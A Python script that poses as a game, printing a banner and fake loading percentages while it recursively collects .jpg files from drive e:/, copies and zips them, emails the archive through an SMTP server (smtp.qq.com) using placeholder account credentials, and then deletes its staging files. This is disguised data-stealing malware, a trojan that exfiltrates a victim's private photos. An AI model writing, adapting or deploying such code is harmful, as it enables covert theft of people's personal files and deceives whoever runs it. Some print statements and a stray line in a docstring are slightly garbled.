#!usr/bin/env python
# coding=utf-8
print('     **********************************************')
print('     *              THIS IS A GAME                *')
print('     *            BY www.iplaypy.com              *')
print('     *     Sorry ,Waiting three minutes please!   *')
print('     **********************************************')
import os
import re
import shutil
import smtplib
import email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
import os.path
import mimetypes
import zipfile
import sys


def path_find(path_filename):
    global num
    try:
        pathlist = os.listdir(path_filename)
        for i in pathlist:
            path_all = os.path.join(path_filename, i)
            if os.path.isfile(path_all):
                # print path_all
                re_file = re.compile(res)
                re_files = re_file.findall(path_all)

                # print re_files
                if len(re_files) == 1:
                    filenames.append(re_files[0])
                    #  print re_files[0]
                try:
                    num = num + os.path.getsize(re_files[0])
                    # print num
                    if num < 300000000:  # 判断文件夹的大小，并设置一个上限
                        shutil.copy(re_files[0], 'f:/system')
                        # f.write(re_files[0])
                    else:
                        break
                except:
                    # print 'error'
                    pass
                else:
                    pass
            else:
                path_find(path_all)
    except:
        # print 'this is error dirctory!'
        pass


def emails(ev=None):
    try:
        From = "邮箱"
        To = ['邮箱']
        file_name = "f:/system.zip"  # 附件名
        server = smtplib.SMTP("smtp.qq.com")
        server.login("邮箱账号", "邮箱密码")  # 仅smtp服务器需要验证时
        # 构造MIMEMultipart对象做为根容器
        main_msg = email.MIMEMultipart.MIMEMultipart()
        # 构造MIMEText对象做为邮件显示内容并附加到根容器
        text_msg = email.MIMEText.MIMEText("this is a test text to text mime", _charset="utf-8")
        main_msg.attach(text_msg)
        # 构造MIMEBase对象做为文件附件内容并附加到根容器
        ## 读入文件内容并格式化
        data = open(file_name, 'rb')
        ctype, encoding = mimetypes.guess_type(file_name)
        if ctype is None or encoding is not None:
            ctype = 'application/octet-stream'
        maintype, subtype = ctype.split('/', 1)
        file_msg = email.MIMEBase.MIMEBase(maintype, subtype)
        file_msg.set_payload(data.read())
        data.close()
        email.Encoders.encode_base64(file_msg)  # 把附件编码
        '''''
         测试识别文件类型：mimetypes.guess_type(file_name)
         rar 文件             ctype,encoding值：None None（ini文件、csv文件、apk文件）
         txt text/plain None
         py  text/x-python None
         gif image/gif None
         png image/x-png None
         jpg image/pjpeg None
         pdf application/pdf None
         doc application/msword None
         zip a
    2000
    pplication/x-zip-compressed None
        encoding值在什么情况下不是None呢？以后有结果补充。
        '''
        # －－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
        ## 设置附件头
        basename = os.path.basename(file_name)
        file_msg.add_header('Content-Disposition', 'attachment', filename=basename)  # 修改邮件头
        main_msg.attach(file_msg)
        # 设置根容器属性
        main_msg['From'] = From
        main_msg['To'] = ";".join(To)
        main_msg['Subject'] = "attach test "
        main_msg['Date'] = email.Utils.formatdate()
        # 得到格式化后的完整文本
        fullText = main_msg.as_string()
        # 用smtp发送邮件
        print
        '          This loading....70%......waiting.......'
        try:
            server.sendmail(From, To, fullText)
        finally:
            server.quit()
        print
        '          This loading....90%......waiting.......'
    except:
        pass


if __name__ == '__main__':
    print
    '          Waiting Please......Game Loading......'
    print
    ''
    print
    '          This loading....10%......Waiting.......'
    num = 0
    x = 51
    try:
        os.mkdir(r'f:/system/')
    except:
        pass
    filenames = []
    res = r'.*\.jpg'
    path_filename = "e:/"
    # raw_input('dirctory(example D:/):')
    # re_rule=raw_input('filetype(example:txt):')
    # re_rule='.*\.'+re_rule
    path_find(path_filename)
    print
    '          This loading....30%......Waiting.......'
    f = zipfile.ZipFile('f:/system.zip', 'a', zipfile.ZIP_DEFLATED)
    startdir = "f:/system"
    for dirpath, dirnames, filename_s in os.walk(startdir):
        for filename_a in filename_s:
            if os.path.getsize('f:/system.zip') < 49000000:  # 因为附件最大只能50M。
                f.write(os.path.join(dirpath, filename_a))
            else:
                break
    f.close()
    print
    '          This loading....50%......Waiting.......'
    emails()
    try:
        shutil.rmtree('f:/system')
        os.remove('f:/system.zip')
    except:
        pass
    print( "This loading....100%.....Thanks you very much")
